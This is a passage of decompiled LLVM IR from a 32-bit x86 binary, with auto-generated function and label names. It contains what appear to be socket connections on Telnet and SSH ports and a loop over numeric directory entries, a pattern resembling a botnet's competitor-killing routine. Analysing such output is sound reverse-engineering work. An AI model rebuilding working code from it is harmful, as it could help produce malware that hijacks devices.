  ret i32 %v0_804e4e4

dec_label_pc_804e4f2:                             ; preds = %dec_label_pc_804e201, %dec_label_pc_804e1e9
  %v2_804e4f5 = inttoptr i32 %v1_804e1f6 to i32*
  %v3_804e4f5 = load i32, i32* %v2_804e4f5, align 4
  store i32 %v3_804e4f5, i32* %edx.global-to-local, align 4
  %v3_804e4f9 = inttoptr i32 %v0_804e1f6 to i32*
  store i32 %v3_804e4f5, i32* %v3_804e4f9, align 4
  %v0_804e4fa = call i32 @function_8052ed4()
  store i32 %v0_804e4fa, i32* %eax.global-to-local, align 4
  %v0_804e4ff = load i32, i32* @esp, align 4
  %v1_804e4ff = add i32 %v0_804e4ff, 20
  %v2_804e4ff = inttoptr i32 %v1_804e4ff to i8*
  %v3_804e4ff = load i8, i8* %v2_804e4ff, align 1
  %v4_804e4ff = sext i8 %v3_804e4ff to i32
  store i32 %v4_804e4ff, i32* @ebx, align 4
  %v1_804e504 = add i32 %v0_804e4ff, 16
  br label %dec_label_pc_804e507

dec_label_pc_804e507:                             ; preds = %dec_label_pc_804e1bd, %dec_label_pc_804e4f2
  %v0_804e507 = phi i32 [ %v15_804df74, %dec_label_pc_804e1bd ], [ %v1_804e504, %dec_label_pc_804e4f2 ]
  %v1_804e50a = add i32 %v0_804e507, -16
  %v2_804e50a = inttoptr i32 %v1_804e50a to i32*
  store i32 1, i32* %v2_804e50a, align 4
  %v1_804e50c = sext i8 %stack_var_-8769.2 to i32
  %v2_804e50c = call i32 @function_8054730(i32 %v1_804e50c)
  store i32 %v2_804e50c, i32* %eax.global-to-local, align 4
  %v0_804e511 = load i32, i32* @esp, align 4
  %v1_804e511 = inttoptr i32 %v0_804e511 to i32*
  store i32 6, i32* %v1_804e511, align 4
  %v3_804e518 = call i32 @function_8051c10(i8 %stack_var_-8769.2)
  store i32 %v3_804e518, i32* %eax.global-to-local, align 4
  %v0_804e51d = load i32, i32* @esp, align 4
  %v1_804e51d = inttoptr i32 %v0_804e51d to i32*
  store i32 7, i32* %v1_804e51d, align 4
  %v3_804e524 = call i32 @function_8051c10(i8 %stack_var_-8769.2)
  store i32 %v3_804e524, i32* %eax.global-to-local, align 4
  %v0_804e529 = load i32, i32* @esp, align 4
  %v1_804e529 = inttoptr i32 %v0_804e529 to i32*
  store i32 9, i32* %v1_804e529, align 4
  %v3_804e530 = call i32 @function_8051c10(i8 %stack_var_-8769.2)
  %v0_804e535 = load i32, i32* @esp, align 4
  %v0_804e538 = load i32, i32* @ebx, align 4
  store i32 %v0_804e538, i32* %eax.global-to-local, align 4
  %v1_804e53a = add i32 %v0_804e535, 8780
  %v1_804e540 = inttoptr i32 %v1_804e53a to i32*
  %v2_804e540 = load i32, i32* %v1_804e540, align 4
  store i32 %v2_804e540, i32* @ebx, align 4
  %v3_804e540 = add i32 %v0_804e535, 8784
  %v1_804e541 = inttoptr i32 %v3_804e540 to i32*
  %v2_804e541 = load i32, i32* %v1_804e541, align 4
  store i32 %v2_804e541, i32* @esi, align 4
  %v3_804e541 = add i32 %v0_804e535, 8788
  %v1_804e542 = inttoptr i32 %v3_804e541 to i32*
  %v2_804e542 = load i32, i32* %v1_804e542, align 4
  store i32 %v2_804e542, i32* @edi, align 4
  %v3_804e542 = add i32 %v0_804e535, 8792
  %v1_804e543 = inttoptr i32 %v3_804e542 to i32*
  %v2_804e543 = load i32, i32* %v1_804e543, align 4
  store i32 %v2_804e543, i32* @ebp, align 4
  ret i32 %v0_804e538

dec_label_pc_804e545:                             ; preds = %dec_label_pc_804df70
  %v3_804e545 = load i8, i8* %stack_var_-48, align 1
  %v4_804e545 = sext i8 %v3_804e545 to i32
  %v4_804e55b = zext i8 %tmp47 to i32
  %v6_804e55b = and i32 %v4_804e545, -256
  %v7_804e55b = or i32 %v6_804e55b, %v4_804e55b
  store i32 %v7_804e55b, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804e024

dec_label_pc_804e57e:                             ; preds = %dec_label_pc_804e32d.backedge, %dec_label_pc_804e343, %dec_label_pc_804e32d.preheader
  %v0_804e336.lcssa = phi i32 [ %v0_804e33685, %dec_label_pc_804e32d.preheader ], [ %v0_804e33688, %dec_label_pc_804e343 ], [ %v0_804e336, %dec_label_pc_804e32d.backedge ]
  %v0_804e581 = load i32, i32* @ebp, align 4
  %v3_804e581 = inttoptr i32 %v0_804e336.lcssa to i32*
  store i32 %v0_804e581, i32* %v3_804e581, align 4
  %v0_804e582 = call i32 @function_8052ed4()
  store i32 %v0_804e582, i32* %eax.global-to-local, align 4
  %v0_804e587 = load i32, i32* @esp, align 4
  %v1_804e587 = add i32 %v0_804e587, 16
  br label %dec_label_pc_804e1e9

; uselistorder directives
  uselistorder i32 %v1_804e498, { 1, 0 }
  uselistorder i32 %v1_804e488, { 2, 0, 1 }
  uselistorder i32 %v0_804e331, { 1, 0, 2 }
  uselistorder i32 %v0_804e45a, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804e42d, { 0, 2, 1 }
  uselistorder i32 %v0_804e33688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804e31b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e29e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804e213, { 0, 2, 1 }
  uselistorder i32 %v1_804e1f6, { 1, 0 }
  uselistorder i32 %v0_804e1f6, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804e1f1, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804e1e9, { 1, 0 }
  uselistorder i32 %v4_804e1c3, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804e17f, { 1, 0 }
  uselistorder i32 %v3_804e177, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804e15a, { 0, 2, 1 }
  uselistorder i32 %v1_804e15a, { 0, 2, 1 }
  uselistorder i32 %v1_804e135, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804e116, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804e113, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804e4a0, { 1, 0, 2 }
  uselistorder i32 %v0_804e488, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804e0c5, { 0, 2, 1 }
  uselistorder i32 %v7_804e0c2, { 1, 0 }
  uselistorder i32 %v0_804e0bf, { 1, 0 }
  uselistorder i32 %v4_804e06c, { 1, 2, 0 }
  uselistorder i32 %v7_804e0a8, { 1, 0, 2 }
  uselistorder i32 %v1_804e0bf, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804e096, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e095, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e0d4, { 1, 0, 2 }
  uselistorder i32 %v2_804dffa, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804df7a, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804df74, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_80526e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805546d.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8052800, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e507, { 1, 0 }
  uselistorder label %dec_label_pc_804e4de, { 1, 0 }
  uselistorder label %dec_label_pc_804e32d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e343, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e9, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804e19b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e07c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804e064.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e113, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e064.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e0a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e095, { 1, 0 }
  uselistorder label %dec_label_pc_804e024, { 1, 0 }
}

define i32 @function_804e590() local_unnamed_addr {
dec_label_pc_804e590:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804e59c = call i32 @function_8052e42(i32* null)
  store i32 %v2_804e59c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e59c, i32* @edi, align 4
  %v0_804e5a3 = call i32 @function_8052baf()
  store i32 %v0_804e5a3, i32* %eax.global-to-local, align 4
  %v12_804e5a8 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804e5a3, i32* @global_var_80572e4.21, align 4
  %tmp113 = icmp slt i32 %v0_804e5a3, 1
  br i1 %tmp113, label %dec_label_pc_804e5bf, label %dec_label_pc_804e5b4

dec_label_pc_804e5b4:                             ; preds = %dec_label_pc_804e7a0, %dec_label_pc_804e671, %dec_label_pc_804e5bf, %dec_label_pc_804e590
  %v0_804e5be = phi i32 [ -1, %dec_label_pc_804e671 ], [ 0, %dec_label_pc_804e5bf ], [ %v0_804e5a3, %dec_label_pc_804e590 ], [ 0, %dec_label_pc_804e7a0 ]
  ret i32 %v0_804e5be

dec_label_pc_804e5bf:                             ; preds = %dec_label_pc_804e590
  %v1_804e5bf = add i32 %v0_804e5a3, 1
  %v8_804e5bf = icmp eq i32 %v1_804e5bf, 0
  store i32 %v1_804e5bf, i32* %eax.global-to-local, align 4
  br i1 %v8_804e5bf, label %dec_label_pc_804e5b4, label %dec_label_pc_804e5c2

dec_label_pc_804e5c2:                             ; preds = %dec_label_pc_804e5bf
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804e5df = call i32 @function_804df70(i32 5888)
  store i32 %v1_804e5df, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804e5f7 = call i32 @function_8053375(i32 2, i32 1, i32 0)
  store i32 %v3_804e5f7, i32* %eax.global-to-local, align 4
  store i32 %v3_804e5f7, i32* @ebx, align 4
  %v10_804e601 = icmp eq i32 %v3_804e5f7, -1
  br i1 %v10_804e601, label %dec_label_pc_804e624, label %dec_label_pc_804e606

dec_label_pc_804e606:                             ; preds = %dec_label_pc_804e5c2
  %v2_804e606 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804e606, i32* %eax.global-to-local, align 4
  %v0_804e60d = load i32, i32* @edx, align 4
  store i32 %v3_804e5f7, i32* %stack_var_-8460, align 4
  %v4_804e612 = call i32 @function_805316f(i32 %v3_804e5f7, i32 %v2_804e606, i32 16, i32 %v0_804e60d)
  store i32 %v4_804e612, i32* %eax.global-to-local, align 4
  %v2_804e617 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e617, i32* @esi, align 4
  store i32 %v2_804e606, i32* @ebp, align 4
  %v0_804e61b = load i32, i32* @ebx, align 4
  store i32 %v0_804e61b, i32* %stack_var_-8460, align 4
  %v2_804e61c = call i32 @function_805322b(i32 %v0_804e61b, i32 1)
  store i32 %v2_804e61c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e624

dec_label_pc_804e624:                             ; preds = %dec_label_pc_804e5c2, %dec_label_pc_804e606
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804e62c = call i32 @function_804df70(i32 5632)
  store i32 %v1_804e62c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804e644 = call i32 @function_8053375(i32 2, i32 1, i32 0)
  store i32 %v3_804e644, i32* %eax.global-to-local, align 4
  store i32 %v3_804e644, i32* @ebx, align 4
  %v10_804e64e = icmp eq i32 %v3_804e644, -1
  br i1 %v10_804e64e, label %dec_label_pc_804e671, label %dec_label_pc_804e653

dec_label_pc_804e653:                             ; preds = %dec_label_pc_804e624
  %v2_804e653 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804e653, i32* %eax.global-to-local, align 4
  %v0_804e65a = load i32, i32* @ecx, align 4
  store i32 %v3_804e644, i32* %stack_var_-8460, align 4
  %v4_804e65f = call i32 @function_805316f(i32 %v3_804e644, i32 %v2_804e653, i32 16, i32 %v0_804e65a)
  %v2_804e664 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e664, i32* %eax.global-to-local, align 4
  %v0_804e668 = load i32, i32* @ebx, align 4
  store i32 %v0_804e668, i32* %stack_var_-8460, align 4
  %v2_804e669 = call i32 @function_805322b(i32 %v0_804e668, i32 1)
  store i32 %v2_804e669, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e671

dec_label_pc_804e671:                             ; preds = %dec_label_pc_804e624, %dec_label_pc_804e653
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804e676 = call i32 @function_8054730(i32 5)
  store i32 %v1_804e676, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804e682 = call i32 @function_8053514(i32 4096)
  %v2_804e682 = inttoptr i32 %v1_804e682 to i8*
  store i32 %v1_804e682, i32* %eax.global-to-local, align 4
  store i32 %v1_804e682, i32* @global_var_80572e0.22, align 32
  store i8 0, i8* %v2_804e682, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_8057260.23, align 32
  %v2_804e6a0 = call i32 @function_8051c90(i8 6)
  store i32 %v2_804e6a0, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804e6ac = call i32 @function_8051c90(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804e6b7 = call i32 @function_8051be0(i32 6, i32* null)
  %v2_804e6bc = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e6bc, i32* @ebx, align 4
  %v2_804e6bf = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804e6bf, i32* %eax.global-to-local, align 4
  store i32 %v2_804e6bf, i32* %stack_var_-8460, align 4
  %v2_804e6c8 = bitcast i32* %stack_var_-8388 to i8*
  %v3_804e6c8 = call i32 @function_8052600(i8* %v2_804e6c8, i32 %v3_804e6b7)
  store i32 %v3_804e6c8, i32* %eax.global-to-local, align 4
  %v2_804e6d1 = add i32 %v3_804e6c8, %v2_804e6bf
  store i32 %v2_804e6d1, i32* @ebx, align 4
  %v0_804e6d3 = call i32 @function_8052bd5()
  store i32 %v0_804e6d3, i32* %eax.global-to-local, align 4
  %v2_804e6db = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804e6d3, i32* %stack_var_-8460, align 4
  %v3_804e6e6 = sext i32 %v0_804e6d3 to i64
  %v4_804e6e6 = call i32 @function_80529f0(i64 %v3_804e6e6, i32 10, i32 %v2_804e6db)
  store i32 %v4_804e6e6, i32* %eax.global-to-local, align 4
  %v0_804e6ee = load i32, i32* @ebx, align 4
  store i32 %v0_804e6ee, i32* %stack_var_-8460, align 4
  %v2_804e6ef = inttoptr i32 %v0_804e6ee to i8*
  %v3_804e6ef = call i32 @function_8052600(i8* %v2_804e6ef, i32 %v4_804e6e6)
  %v2_804e6f4 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e6f4, i32* @ebp, align 4
  %v0_804e6f5 = load i32, i32* @ebx, align 4
  %v2_804e6f5 = add i32 %v0_804e6f5, %v3_804e6ef
  store i32 %v2_804e6f5, i32* @ebx, align 4
  store i32 %v4_804e6e6, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804e6fc = call i32 @function_8051be0(i32 7, i32* null)
  store i32 %v3_804e6fc, i32* %eax.global-to-local, align 4
  %v0_804e704 = load i32, i32* @ebx, align 4
  store i32 %v0_804e704, i32* %stack_var_-8460, align 4
  %v2_804e705 = inttoptr i32 %v0_804e704 to i8*
  %v3_804e705 = call i32 @function_8052600(i8* %v2_804e705, i32 %v3_804e6fc)
  store i32 %v3_804e705, i32* @esi, align 4
  store i32 %v2_804e6bf, i32* %eax.global-to-local, align 4
  store i32 %v2_804e6bf, i32* %stack_var_-8460, align 4
  %v3_804e715 = call i32 @function_8052c92(i8* %v2_804e6c8, i32 0)
  store i32 %v3_804e715, i32* %eax.global-to-local, align 4
  %v10_804e71d = icmp eq i32 %v3_804e715, -1
  br i1 %v10_804e71d, label %dec_label_pc_804e5b4, label %dec_label_pc_804e726

dec_label_pc_804e726:                             ; preds = %dec_label_pc_804e671
  store i32 %v3_804e715, i32* %stack_var_-8460, align 4
  %v1_804e72a = call i32 @function_8052b81(i32 %v3_804e715)
  store i32 %v1_804e72a, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804e736 = call i32 @function_8051c10(i8 6)
  store i32 %v2_804e736, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804e742 = call i32 @function_8051c10(i8 7)
  %v0_804e74a = load i32, i32* @global_var_80572e0.22, align 32
  store i32 %v2_804e6bf, i32* %eax.global-to-local, align 4
  store i32 %v2_804e6bf, i32* %stack_var_-8460, align 4
  %v4_804e75a = call i32 @function_8052d52(i8* %v2_804e6c8, i32 %v0_804e74a, i32 4095)
  store i32 %v4_804e75a, i32* %eax.global-to-local, align 4
  %v10_804e764 = icmp eq i32 %v4_804e75a, -1
  br i1 %v10_804e764, label %dec_label_pc_804e772, label %dec_label_pc_804e769

dec_label_pc_804e769:                             ; preds = %dec_label_pc_804e726
  %v0_804e769 = load i32, i32* @global_var_80572e0.22, align 32
  store i32 %v0_804e769, i32* %eax.global-to-local, align 4
  %v2_804e76e = add i32 %v0_804e769, %v4_804e75a
  %v3_804e76e = inttoptr i32 %v2_804e76e to i8*
  store i8 0, i8* %v3_804e76e, align 1
  br label %dec_label_pc_804e772

dec_label_pc_804e772:                             ; preds = %dec_label_pc_804e726, %dec_label_pc_804e769
  %v0_804e778 = load i32, i32* @ebx, align 4
  %v1_804e778 = load i32, i32* @esi, align 4
  %v2_804e778 = sub i32 %v0_804e778, %v2_804e6bf
  %v2_804e77b = add i32 %v2_804e778, %v1_804e778
  %v0_804e77d = load i32, i32* @edi, align 4
  store i32 %v0_804e77d, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804e6bf, i32* @eax, align 4
  store i32 %v2_804e6bf, i32* %stack_var_-8460, align 4
  %v2_804e78a = call i32 @function_8052670(i32 %v2_804e6bf, i32 %v2_804e77b)
  store i32 %v2_804e78a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7a0

dec_label_pc_804e7a0:                             ; preds = %dec_label_pc_804e9d3, %dec_label_pc_804e772
  %storemerge8 = phi i32 [ %v1_804e9e0, %dec_label_pc_804e9d3 ], [ %v12_804e5a8, %dec_label_pc_804e772 ]
  %v1_804e7a3 = add i32 %storemerge8, -16
  %v2_804e7a3 = inttoptr i32 %v1_804e7a3 to i32*
  store i32 6, i32* %v2_804e7a3, align 4
  %v2_804e7a5 = call i32 @function_8051c90(i8 0)
  store i32 %v2_804e7a5, i32* %eax.global-to-local, align 4
  %v0_804e7aa = load i32, i32* @esp, align 4
  %v1_804e7aa = inttoptr i32 %v0_804e7aa to i32*
  %v2_804e7aa = load i32, i32* %v1_804e7aa, align 4
  store i32 %v2_804e7aa, i32* %eax.global-to-local, align 4
  %v3_804e7aa = add i32 %v0_804e7aa, 4
  %v1_804e7ab = inttoptr i32 %v3_804e7aa to i32*
  store i32 0, i32* %v1_804e7ab, align 4
  store i32 6, i32* %v1_804e7aa, align 4
  %v3_804e7b0 = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e7b0, i32* %eax.global-to-local, align 4
  %v1_804e7b5 = load i32, i32* @esp, align 4
  %v2_804e7b5 = inttoptr i32 %v1_804e7b5 to i32*
  store i32 %v3_804e7b0, i32* %v2_804e7b5, align 4
  %v1_804e7b8 = call i32 @function_8052f44(i32 0)
  store i32 %v1_804e7b8, i32* %eax.global-to-local, align 4
  %v1_804e7bd = load i32, i32* @esp, align 4
  %v2_804e7bd = add i32 %v1_804e7bd, 32
  %v3_804e7bd = inttoptr i32 %v2_804e7bd to i32*
  store i32 %v1_804e7b8, i32* %v3_804e7bd, align 4
  %v0_804e7c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7c4 = icmp eq i32 %v0_804e7c4, 0
  br i1 %v1_804e7c4, label %dec_label_pc_804e5b4, label %dec_label_pc_804e7cc

dec_label_pc_804e7cc:                             ; preds = %dec_label_pc_804e7a0
  %v0_804e7c1 = load i32, i32* @esp, align 4
  %v2_804e7cf = inttoptr i32 %v0_804e7c1 to i32*
  store i32 6, i32* %v2_804e7cf, align 4
  %v2_804e7d1 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804e7d1, i32* %eax.global-to-local, align 4
  %v0_804e7d6 = load i32, i32* @esp, align 4
  %v1_804e7d6 = add i32 %v0_804e7d6, 16
  br label %dec_label_pc_804e7e0

dec_label_pc_804e7e0:                             ; preds = %dec_label_pc_804e9e8, %dec_label_pc_804e9f4, %dec_label_pc_804e7fa, %dec_label_pc_804ea11, %dec_label_pc_804e9c8, %dec_label_pc_804e83c, %dec_label_pc_804ecac, %dec_label_pc_804e7cc
  %v0_804e7e0 = phi i32 [ %v1_804e7d6, %dec_label_pc_804e7cc ], [ %v1_804ece0, %dec_label_pc_804ecac ], [ %v1_804e82e, %dec_label_pc_804e83c ], [ %v0_804e9ca, %dec_label_pc_804e9c8 ], [ %v1_804ea1b, %dec_label_pc_804ea11 ], [ %v1_804e7ed, %dec_label_pc_804e7fa ], [ %v1_804e82e, %dec_label_pc_804e9f4 ], [ %v1_804e82e, %dec_label_pc_804e9e8 ]
  %v1_804e7e3 = add i32 %v0_804e7e0, 16
  %v2_804e7e3 = inttoptr i32 %v1_804e7e3 to i32*
  %v3_804e7e3 = load i32, i32* %v2_804e7e3, align 4
  store i32 %v3_804e7e3, i32* %eax.global-to-local, align 4
  %v2_804e7e7 = add i32 %v0_804e7e0, -16
  %v3_804e7e7 = inttoptr i32 %v2_804e7e7 to i32*
  store i32 %v3_804e7e3, i32* %v3_804e7e7, align 4
  %v0_804e7e8 = call i32 @function_8053035()
  store i32 %v0_804e7e8, i32* %eax.global-to-local, align 4
  %v0_804e7ed = load i32, i32* @esp, align 4
  store i32 %v0_804e7e8, i32* @edx, align 4
  %v1_804e7f2 = icmp eq i32 %v0_804e7e8, 0
  br i1 %v1_804e7f2, label %dec_label_pc_804e9d3, label %dec_label_pc_804e7fa

dec_label_pc_804e7fa:                             ; preds = %dec_label_pc_804e7e0
  %v1_804e7ed = add i32 %v0_804e7ed, 16
  %v1_804e7fa = add i32 %v0_804e7e8, 11
  %v2_804e7fa = inttoptr i32 %v1_804e7fa to i8*
  %v3_804e7fa = load i8, i8* %v2_804e7fa, align 1
  %v4_804e7fa = zext i8 %v3_804e7fa to i32
  %v6_804e7fa = and i32 %v0_804e7e8, -256
  %v7_804e7fa = or i32 %v4_804e7fa, %v6_804e7fa
  %v1_804e7fd = add i32 %v7_804e7fa, -48
  %v8_804e7fd = trunc i32 %v1_804e7fd to i8
  store i32 %v1_804e7fd, i32* %eax.global-to-local, align 4
  %v8_804e802 = icmp ugt i8 %v8_804e7fd, 9
  br i1 %v8_804e802, label %dec_label_pc_804e7e0, label %dec_label_pc_804e804

dec_label_pc_804e804:                             ; preds = %dec_label_pc_804e7fa
  store i32 %v1_804e7fa, i32* @edi, align 4
  %v3_804e80a = inttoptr i32 %v0_804e7ed to i32*
  store i32 %v1_804e7fa, i32* %v3_804e80a, align 4
  %v0_804e80b = call i32 @function_8054586()
  store i32 %v0_804e80b, i32* %eax.global-to-local, align 4
  %v0_804e810 = load i32, i32* @esp, align 4
  store i32 %v0_804e80b, i32* @ebp, align 4
  %v1_804e815 = add i32 %v0_804e810, 28
  %v2_804e815 = inttoptr i32 %v1_804e815 to i32*
  %v3_804e815 = load i32, i32* %v2_804e815, align 4
  %v1_804e819 = add i32 %v3_804e815, 1
  store i32 %v1_804e819, i32* %eax.global-to-local, align 4
  %v0_804e81a = load i32, i32* @esi, align 4
  store i32 %v1_804e819, i32* %v2_804e815, align 4
  %v5_804e820 = icmp slt i32 %v0_804e81a, %v0_804e80b
  %v0_804e843 = load i32, i32* @esp, align 4
  %v1_804e846 = add i32 %v0_804e843, -16
  %v2_804e846 = inttoptr i32 %v1_804e846 to i32*
  store i32 0, i32* %v2_804e846, align 4
  %v2_804e848 = call i32 @function_8052e42(i32* null)
  store i32 %v2_804e848, i32* %eax.global-to-local, align 4
  br i1 %v5_804e820, label %dec_label_pc_804e843, label %dec_label_pc_804e822

dec_label_pc_804e822:                             ; preds = %dec_label_pc_804e804
  %v1_804e82c = load i32, i32* @ebx, align 4
  %v2_804e82c = sub i32 %v2_804e848, %v1_804e82c
  store i32 %v2_804e82c, i32* %eax.global-to-local, align 4
  %v0_804e82e = load i32, i32* @esp, align 4
  %v1_804e82e = add i32 %v0_804e82e, 16
  %v1_804e831 = add i32 %v2_804e82c, -600
  %v6_804e831 = sub i32 599, %v2_804e82c
  %v7_804e831 = and i32 %v6_804e831, %v2_804e82c
  %v8_804e831 = icmp slt i32 %v7_804e831, 0
  %v9_804e831 = icmp eq i32 %v1_804e831, 0
  %v10_804e831 = icmp slt i32 %v1_804e831, 0
  %v3_804e836 = icmp ne i1 %v10_804e831, %v8_804e831
  %v4_804e836 = or i1 %v9_804e831, %v3_804e836
  br i1 %v4_804e836, label %dec_label_pc_804e9e8, label %dec_label_pc_804e83c

dec_label_pc_804e83c:                             ; preds = %dec_label_pc_804e822
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804e7e0

dec_label_pc_804e843:                             ; preds = %dec_label_pc_804e804
  store i32 %v2_804e848, i32* %eax.global-to-local, align 4
  %v0_804e84d = load i32, i32* @esp, align 4
  %v1_804e84d = inttoptr i32 %v0_804e84d to i32*
  store i32 6, i32* %v1_804e84d, align 4
  %v1_804e854 = load i32, i32* @esp, align 4
  %v2_804e854 = add i32 %v1_804e854, 24
  %v3_804e854 = inttoptr i32 %v2_804e854 to i32*
  store i32 %v2_804e848, i32* %v3_804e854, align 4
  %v2_804e858 = call i32 @function_8051c90(i8 0)
  store i32 %v2_804e858, i32* %eax.global-to-local, align 4
  %v0_804e85d = load i32, i32* @esp, align 4
  %v1_804e85d = inttoptr i32 %v0_804e85d to i32*
  store i32 7, i32* %v1_804e85d, align 4
  %v2_804e864 = call i32 @function_8051c90(i8 0)
  store i32 %v2_804e864, i32* %eax.global-to-local, align 4
  %v0_804e869 = load i32, i32* @esp, align 4
  %v1_804e869 = inttoptr i32 %v0_804e869 to i32*
  %v3_804e869 = add i32 %v0_804e869, 4
  %v1_804e86a = inttoptr i32 %v3_804e869 to i32*
  %v2_804e86a = load i32, i32* %v1_804e86a, align 4
  store i32 %v2_804e86a, i32* @ebx, align 4
  store i32 0, i32* %v1_804e86a, align 4
  store i32 6, i32* %v1_804e869, align 4
  %v3_804e86f = call i32 @function_8051be0(i32 0, i32* nonnull @0)
  store i32 %v3_804e86f, i32* %eax.global-to-local, align 4
  %v0_804e874 = load i32, i32* @esp, align 4
  %v1_804e874 = inttoptr i32 %v0_804e874 to i32*
  %v3_804e874 = add i32 %v0_804e874, 4
  %v1_804e875 = inttoptr i32 %v3_804e874 to i32*
  store i32 %v3_804e86f, i32* %v1_804e875, align 4
  %v1_804e877 = add i32 %v0_804e874, 8328
  store i32 %v1_804e877, i32* %eax.global-to-local, align 4
  store i32 %v1_804e877, i32* %v1_804e874, align 4
  %v3_804e87f = call i32 @function_8052600(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e87f, i32* %eax.global-to-local, align 4
  %v0_804e884 = load i32, i32* @esp, align 4
  %v1_804e884 = add i32 %v0_804e884, 8328
  %v1_804e88b = inttoptr i32 %v0_804e884 to i32*
  %v3_804e88b = add i32 %v0_804e884, 4
  %v2_804e88c = add i32 %v1_804e884, %v3_804e87f
